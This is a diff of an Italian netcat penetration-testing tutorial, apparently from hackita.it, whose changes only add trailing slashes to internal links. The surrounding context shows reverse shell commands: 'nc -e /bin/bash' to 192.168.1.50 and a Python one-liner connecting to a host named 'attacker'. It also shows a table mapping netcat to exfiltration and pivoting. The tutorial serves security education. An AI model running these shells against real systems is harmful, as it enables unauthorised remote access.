@@ -26,9 +26,9 @@ NC è il tool più versatile della toolchain offensiva, utilizzabile in quasi og
 
 | Fase           | Tool Precedente                                    | Netcat                   | Tool Successivo                                  |
 | -------------- | -------------------------------------------------- | ------------------------ | ------------------------------------------------ |
-| Recon          | [Nmap](https://hackita.it/articoli/nmap) port scan | → Banner grabbing        | → Service enum                                   |
+| Recon          | [Nmap](https://hackita.it/articoli/nmap/) port scan | → Banner grabbing        | → Service enum                                   |
 | Initial Access | Exploit delivery                                   | → Reverse shell listener | → Shell stabilization                            |
-| Execution      | Web shell                                          | → Bind shell             | → [LinPEAS](https://hackita.it/articoli/linpeas) |
+| Execution      | Web shell                                          | → Bind shell             | → [LinPEAS](https://hackita.it/articoli/linpeas/) |
 | Exfiltration   | Data collection                                    | → File transfer          | → Offline analysis                               |
 | Pivoting       | Host compromise                                    | → Port relay             | → Internal scan                                  |
 
@@ -149,7 +149,7 @@ listening on [any] 4444 ...
 
 ### Reverse Shell Linux - Target
 
-Con [netcat](https://hackita.it/articoli/netcat) tradizionale (-e disponibile):
+Con [netcat](https://hackita.it/articoli/netcat/) tradizionale (-e disponibile):
 
 ```bash
 nc -e /bin/bash 192.168.1.50 4444
@@ -251,7 +251,7 @@ Output:
 (UNKNOWN) [192.168.1.100] 22 (ssh) open
 ```
 
-Per scanning più avanzato, usa [Nmap](https://hackita.it/articoli/nmap).
+Per scanning più avanzato, usa [Nmap](https://hackita.it/articoli/nmap/).
 
 ## Scenari Pratici di Penetration Test
 
@@ -387,10 +387,10 @@ python -c 'import socket,subprocess;s=socket.socket();s.connect(("attacker",4444
 
 | Netcat +                                                       | Risultato       | Esempio                     |
 | -------------------------------------------------------------- | --------------- | --------------------------- |
-| [Metasploit](https://hackita.it/articoli/metasploit-framework) | Upgrade shell   | nc shell → sessions -u      |
-| [Socat](https://hackita.it/articoli/socat)                     | PTY completo    | nc trasporto, socat PTY     |
-| [Chisel](https://hackita.it/articoli/chisel)                   | Tunnel avanzati | nc initial → chisel SOCKS   |
-| [WinPEAS](https://hackita.it/articoli/winpeas)                 | Enum post-shell | nc shell → transfer winpeas |
+| [Metasploit](https://hackita.it/articoli/metasploit/) | Upgrade shell   | nc shell → sessions -u      |
+| [Socat](https://hackita.it/articoli/socat/)                     | PTY completo    | nc trasporto, socat PTY     |
+| [Chisel](https://hackita.it/articoli/chisel/)                   | Tunnel avanzati | nc initial → chisel SOCKS   |
+| [WinPEAS](https://hackita.it/articoli/winpeas/)                 | Enum post-shell | nc shell → transfer winpeas |
 
 ## Confronto Varianti Netcat
 
